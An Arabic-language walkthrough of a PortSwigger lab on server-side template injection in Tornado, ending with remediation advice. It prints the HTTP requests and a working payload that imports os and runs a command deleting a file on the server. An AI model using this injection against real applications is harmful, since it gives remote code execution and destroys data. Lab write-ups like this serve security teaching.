# [Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

## **`الهدف`**
قم بمراجعة وثائق `Tornado` لمعرفة كيف تنفذ كود على السيرفر ثم قم بحذف ملف `morale.txt` الموجود في `Carlos's home directory`.
## **`خطوات الحل`**
سنقوم بتسجيل الدخول إلى حساب `wiener:peter` وبعد ذلك سنلاحظ وجود خاصية `Preferred name` وهناك ثلاث خيارات وهم : `Name - First Name - Nickname` وعند اختيار أى منهم والضغط على `Submit` سيتم إرسال الطلب التالي:
```http
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0a55003303830a9c80eb2b09008a00ed.web-security-academy.net
Cookie: session=aWQ8zMFc1y06NuIvtUdQZ6c3kk2R728s

blog-post-author-display=user.nickname&csrf=C5LcZrMIa4cfpL3e1OE7FtPQP58aODrE
```
وسنلاحظ وجود معلم `blog-post-author-display` سيتم وضع فيه قيمة اختيارنا.

وإذا قمنا بالتوجه إلى أى تدوينة ووضعنا تعليق سنجد أن الاسم المكتوب بجانب التعليق يتغير بناء على هذا الاختيار

ومن خلال وثائق `Tornado` وهو القالب المستخدم في هذا اللاب سنجد أن تعابير القوالب تكون محاطة بأقواس مزدوجة كالتالي:
```Python
{{TestExpression}}`
```

لذلك سنقوم بعمل طلب باستخدام الـ `Payload` التالي :
```Python
user.name}}{{7*7}}
```

وسنقوم بوضعه كقيمة معلم `blog-post-author-display` في الطلب
```http
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0a55003303830a9c80eb2b09008a00ed.web-security-academy.net
Cookie: session=aWQ8zMFc1y06NuIvtUdQZ6c3kk2R728s

blog-post-author-display=user.name}}{{7*7}}&csrf=C5LcZrMIa4cfpL3e1OE7FtPQP58aODrE
```

وعند الدخول إلى أى تدوينة سنجد  أن الاسم المكتوب بجانب التعليق الخاص بنا هو:
```
Peter Wiener49}}
```

ومن خلال وثائق `Tornado`، سنجد صيغة تنفيذ أكواد `Python` هي كالتالي:
```Python
{% TestPython %}
```

ومن خلال وثائق `Python`، سنجد أنه من خلال استيرا `os module` يمكن استخدام دالة `system()` لتنفيذ أى أوامر على نظام التشغيل

لذلك سنقوم بعمل طلب باستخدام الـ `Payload` التالي :
```Python
{% import os %} {{os.system('rm /home/carlos/morale.txt')
```

وسنقوم بوضعه كقيمة معلم `blog-post-author-display` في الطلب بعد ترميزه
```http
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0a55003303830a9c80eb2b09008a00ed.web-security-academy.net
Cookie: session=aWQ8zMFc1y06NuIvtUdQZ6c3kk2R728s

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')&csrf=C5LcZrMIa4cfpL3e1OE7FtPQP58aODrE
```

بعد ذلك سنقوم بالتوجه إلى أى تدوينة بها تعليق قمنا بكتابته لننتهي من حل اللاب
## **`ترقيع الثغرة`**
يجب ألا يتم بناء القوالب ديناميكيًا باستخدام مدخلات غير موثوقة، وبدلاً من ذلك، نستخدم قالباً ثابتاً، ونمرر مدخلات المستخدم إليه كمتغير.

وإذا كان التطبيق لا يحتاج إلى قوة لغة البرمجة كاملة داخل القالب، فيُفضل استبدال `Tornado` (الذي يسمح بتنفيذ أوامر النظام) بمحركات قوالب أكثر تقييداً وأماناً بحيث لا تسمح بتنفيذ أوامر `RCE` بشكل افتراضي.

وبما أن خاصية `Preferred name` بها ثلاث خيارات محددة مسبقًا فيجب  على السيرفر أن يتحقق من أن القيمة المُرسلة في معلم `blog-post-author-display` تطابق تماماً إحدى هذه القيم الثلاثة فقط.
